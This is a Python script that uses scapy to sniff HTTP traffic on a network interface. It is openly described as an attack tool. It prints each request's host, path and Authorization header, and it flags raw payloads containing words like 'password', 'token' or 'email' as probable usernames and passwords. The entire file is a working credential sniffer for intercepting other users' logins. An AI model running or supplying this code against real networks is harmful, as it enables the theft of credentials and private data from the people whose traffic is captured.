import scapy.all as scapy
from scapy.layers import http

from optparse import OptionParser

def get_args():
    parse = OptionParser()
    parse.add_option(
        "-i",
        "--interface",
        dest="interface",
        help="Provide the interface you want to run the attack from"
    )
    ( options ,args ) = parse.parse_args()
    if not options.interface:
        parse.error("Provide the params please ,type --help for more info")
    return options

def sniff(interface):
    scapy.sniff(iface=interface ,prn=analyse_packets)

def analyse_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Target Site : " ,packet[http.HTTPRequest].Host)
        print("Site Path : " ,packet[http.HTTPRequest].Path)
        print("User Authorization : " ,packet[http.HTTPRequest].Authorization)
        if packet.haslayer(scapy.Raw):
            keywords = ["token" ,"user" ,
            "username","pass" ,"password",
            "email","name"]
            for keyword in keywords:
                if keyword in packet[scapy.Raw].load:
                    print("*************************\n\n")
                    print("userful info probibility of [username , password]: " , packet[scapy.Raw].load)
                    print("\n\n*************************")
                    break

sniff(get_args().interface)